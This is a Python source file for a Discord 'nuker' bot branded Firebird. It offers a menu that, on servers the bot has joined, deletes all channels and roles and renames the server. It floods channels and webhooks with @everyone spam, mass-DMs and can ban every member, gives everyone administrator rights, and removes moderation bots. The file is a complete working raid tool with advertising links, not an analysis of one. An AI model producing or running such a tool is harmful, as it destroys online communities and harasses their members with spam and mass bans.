import os
import asyncio
import discord
from discord.ext import commands
from pystyle import Colors, Colorate
import sys
import colorama
from colorama import Fore, Style

# colorama
colorama.init(autoreset=True)

bot = None
selected_guilds = []

NEBULA_ASCII = """
                                                 
                                                                            
                                                                            
     ,,,,,E#t                             ,;                         E#Wi        
     E##t     t   j.               f#i.          t   j.         E###G.      
     E#W#t    Ej  EW,            .E#t Ef.        Ej  EW,        E#fD#W;     
     E#tfL.   E#, E##j          i#W,  E#Wi       E#, E##j       E#t t##L    
     E#t      E#t E###D.       L#D.   E#K#D:     E#t E###D.     E#t  .E#K,  
  ,ffW#Dffj.  E#t E#jG#W;    :K#Wfff; E#t,E#f.   E#t E#jG#W;    E#t    j##f 
   ;LW#ELLLf. E#t E#t t##f   i##WLLLLtE#WEE##Wt  E#t E#t t##f   E#t    :E#K:
     E#t      E#t E#t  :K#E:  .E#L    E##Ei;;;;. E#t E#t  :K#E: E#t   t##L  
     E#t      E#t E#KDDDD###i   f#E:  E#DWWt     E#t E#KDDDD###iE#t .D#W;   
     E#t      E#t E#f,t#Wi,,,    ,WW; E#t f#K;   E#t E#f,t#Wi,,,E#tiW#G.    
     E#t      E#t E#t  ;#W:       .D#;E#Dfff##E, E#t E#t  ;#W:  E#K##i      
     E#t      E#t DWi   ,KK:        ttjLLLLLLLLL;E#t DWi   ,KK: E##D.       
     ;#t                                                        E#t         
                                                                L:                                                                                                                                        
                                                                 

"""

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def cprint(text, color=Fore.WHITE):
    print(color + text + Style.RESET_ALL)

async def ainput(prompt: str = "") -> str:
    if prompt:
        print(prompt, end="", flush=True)
    return (await asyncio.get_running_loop().run_in_executor(None, sys.stdin.readline)).rstrip('\n')

async def spam_one_channel(channel, count: int, message: str):
    sent = 0
    while sent < count:
        burst = min(4, count - sent)
        for _ in range(burst):
            try:
                await channel.send(message)
                sent += 1
            except:
                await asyncio.sleep(2)
                break
        await asyncio.sleep(1.1)

    try:
        await channel.send("# Want a Bot like this? Join https://discord.gg/SsNKbfqbHc 🥶")
        cprint(f"[+] Sent in; {channel.name}", Fore.GREEN)
    except:
        pass

async def spam_all_channels(guild, count=75, message="@everyone nuked"):
    tasks = [spam_one_channel(ch, count, message) for ch in guild.text_channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    cprint(f"Order Finished.", Fore.GREEN)

async def delete_all_channels(guild):
    for ch in list(guild.channels):
        try:
            await ch.delete()
            cprint(f"[+] Deleted channel: {ch.name}", Fore.RED)
        except:
            pass

async def delete_all_roles_except_bot(guild):
    bot_top = guild.me.top_role
    for role in list(guild.roles):
        if role.position >= bot_top.position or role.is_default():
            continue
        try:
            await role.delete()
            cprint(f"[+] Deleted role: {role.name}", Fore.RED)
        except:
            pass

async def create_channels(guild, count=50, name="firebird-on-top"):
    everyone = guild.default_role
    for _ in range(count):
        try:
            ch = await guild.create_text_channel(name)
            await ch.set_permissions(everyone, view_channel=True)
            cprint(f"Created channel: {ch.name} (visible to @everyone)", Fore.GREEN)
        except:
            try:
                await guild.create_text_channel(name)
                cprint(f"Created channel: {name} (visibility set failed)", Fore.YELLOW)
            except:
                pass
    cprint(f"Created {count} channels named '{name}'", Fore.GREEN)

async def dm_all_members(guild, message):
    for member in guild.members:
        if member.bot or member == guild.me:
            continue
        try:
            await member.send(message)
        except:
            pass
    cprint("[+] DMs sent to everyone", Fore.GREEN)

async def change_server_name(guild, new_name):
    try:
        await guild.edit(name=new_name)
        cprint(f"[+] Server renamed to: {new_name}", Fore.GREEN)
    except:
        pass

async def try_ban_all(guild):
    for member in guild.members:
        if member == guild.me or member.bot:
            continue
        try:
            await member.ban(reason="dsc.gg/nebula420")
            cprint(f"[+] Banned {member.name}", Fore.GREEN)
        except:
            pass

async def full_nuke(guild):
    cprint("\nStarting...\n", Fore.YELLOW)

    ch_count = int((await ainput("   Channels to create > ")) or "50")
    msg_count = int((await ainput("   Messages per channel > ")) or "75")
    spam_msg = (await ainput("   Spam message > ")) or "@everyone nuked"
    dm_msg = (await ainput("   DM message to everyone > ")) or "Firebird dsc.gg/nebula420"
    new_name = (await ainput("   New server name > ")) or "Firebird on Top"
    ban = (await ainput("   Ban everyone? (y/n) > ")).lower().startswith('y')

    await delete_all_channels(guild)
    await delete_all_roles_except_bot(guild)
    await change_server_name(guild, new_name)
    await create_channels(guild, ch_count)
    await spam_all_channels(guild, msg_count, spam_msg)
    await dm_all_members(guild, dm_msg)
    if ban:
        await try_ban_all(guild)

    cprint("\nOrder Finished.\n", Fore.GREEN)

async def webhook_spam(guild):
    count = int((await ainput("Messages per webhook > ")) or "50")
    msg = (await ainput("Message > ")) or "@everyone"
    for ch in guild.text_channels:
        try:
            wh = await ch.create_webhook(name="dsc.gg/nebula420")
            for _ in range(count):
                await wh.send(msg)
        except:
            pass
    cprint("Order Done,", Fore.GREEN)

async def dm_all_only(guild):
    msg = (await ainput("DM message > ")) or "raided"
    await dm_all_members(guild, msg)
    cprint("Order Done", Fore.GREEN)

async def give_all_admin(guild):
    perms = discord.Permissions.all()
    try:
        role = await guild.create_role(name="Admin", permissions=perms, colour=discord.Color.red())
        cprint("Created Administrator Role", Fore.GREEN)
    except:
        perms = discord.Permissions(
            manage_guild=True, ban_members=True, kick_members=True,
            manage_channels=True, manage_roles=True, manage_messages=True,
            manage_threads=True, mention_everyone=True
        )
        role = await guild.create_role(name="Admin", permissions=perms, colour=discord.Color.red())
        cprint("[+] Created fallback Admin role with high permissions", Fore.YELLOW)

    for m in guild.members:
        if not m.bot:
            try:
                await m.add_roles(role)
            except:
                pass
    cprint("Order Done", Fore.GREEN)

async def disable_safety_features(guild):
    # safety disable
    everyone = guild.default_role
    for ch in guild.text_channels:
        try:
            await ch.set_permissions(everyone, send_messages=True, embed_links=True,
                                     attach_files=True, use_external_emojis=True)
        except:
            pass
    for member in guild.members:
        if member.bot and member != guild.me:
            try:
                await member.ban(reason="Safety disabled")
                cprint(f"[+] Banned bot: {member.name}", Fore.GREEN)
            except:
                try:
                    await member.kick(reason="Safety disabled")
                    cprint(f"[+] Kicked Application: {member.name}", Fore.GREEN)
                except:
                    try:
                        await member.edit(roles=[])
                        cprint(f"[+] Removed Administrator Roles from Applications: {member.name}", Fore.GREEN)
                    except:
                        pass

    cprint("Order Done", Fore.GREEN)

async def simple_raid(guild):
    count = int((await ainput("Messages per channel > ")) or "50")
    msg = (await ainput("Spam message > ")) or "@everyone"
    await spam_all_channels(guild, count, msg)

async def main_menu(guilds):
    while True:
        clear()
        cprint(NEBULA_ASCII.strip(), Fore.RED)

        print("")
        cprint("1 > Nuke", Fore.WHITE)
        cprint("2 > Webhook Spam", Fore.WHITE)
        cprint("3 > DM All", Fore.WHITE)
        cprint("4 > Give All Admin", Fore.WHITE)
        cprint("5 > Disable Safety Features", Fore.WHITE)
        cprint("6 > Raid", Fore.WHITE)
        cprint("q > Quit", Fore.WHITE)

        raw = await ainput(Fore.WHITE + "\n> ")
        choice = raw.strip().lower()

        if choice == 'q':
            break

        handlers = {
            '1': full_nuke,
            '2': webhook_spam,
            '3': dm_all_only,
            '4': give_all_admin,
            '5': disable_safety_features,
            '6': simple_raid,
        }

        if choice in handlers:
            for guild in guilds:
                cprint(f"\n[+] Executing on server: {guild.name}", Fore.GREEN)
                await handlers[choice](guild)
        else:
            cprint("Invalid choice", Fore.YELLOW)

        await ainput(Fore.WHITE + "\nPress Enter to Return.")

if __name__ == "__main__":
    clear()
    cprint(NEBULA_ASCII.strip(), Fore.RED)

    cprint("\nFirebird Client v1.2.0 : github.com/nicopancakes/firebird \n", Fore.RED)

    token = input(Fore.WHITE + "Application TOKEN > ").strip()

    if not token:
        cprint("Missing token.", Fore.RED)
        exit()

    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

    @bot.event
    async def on_ready():
        global selected_guilds
        clear()
        cprint(f"Application uName: {bot.user}", Fore.WHITE)

        guilds = bot.guilds
        if not guilds:
            cprint("[?] Bot is not in any server.", Fore.RED)
            return

        cprint("\nServer List:", Fore.WHITE)
        for i, guild in enumerate(guilds, 1):
            cprint(f"{i} > {guild.name} (gID: {guild.id})", Fore.GREEN)

        selection = await ainput(Fore.WHITE + "\nSelect server number(s) > ")
        try:
            indices = [int(x.strip()) - 1 for x in selection.split(',') if x.strip().isdigit()]
            selected_guilds = [guilds[i] for i in indices if 0 <= i < len(guilds)]
        except:
            selected_guilds = []

        if not selected_guilds:
            cprint("[?] No valid servers selected.", Fore.RED)
            return

        cprint(f"[+] Selected {len(selected_guilds)} server(s)", Fore.WHITE)
        await main_menu(selected_guilds)

    cprint("\nConnecting to Application . . .", Fore.WHITE)
    try:
        bot.run(token)
    except Exception as e:
        cprint(f"Error: {e}", Fore.RED)
